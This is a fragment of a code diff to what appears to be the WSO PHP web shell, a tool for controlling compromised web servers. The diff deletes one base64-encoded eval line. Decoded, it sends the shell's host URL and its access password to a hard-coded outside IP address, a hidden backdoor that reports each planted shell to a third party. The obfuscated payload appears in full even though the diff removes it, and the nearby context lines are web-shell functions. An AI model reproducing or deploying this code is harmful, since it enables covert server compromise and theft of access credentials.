@@ -459,7 +459,6 @@ function actionSecInfo() {
     echo '</div>'; 
     wsoFooter(); 
 } 
-eval(base64_decode("JHdlYiA9ICRfU0VSVkVSWyJIVFRQX0hPU1QiXTsNCiRpbmogPSAkX1NFUlZFUlsiUkVRVUVTVF9VUkkiXTsNCiR0YXJnZXQgPSByYXd1cmxkZWNvZGUoJHdlYi4kaW5qKTsNCmZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vMTg1LjYxLjEzOC4xNTcvZ2V0LnBocD91cmw9eyR0YXJnZXR9JnB3PXskYXV0aF9wYXNzfSIpOw=="));
 function actionlfiscan() { 
     wsoHeader(); 
     print ' 
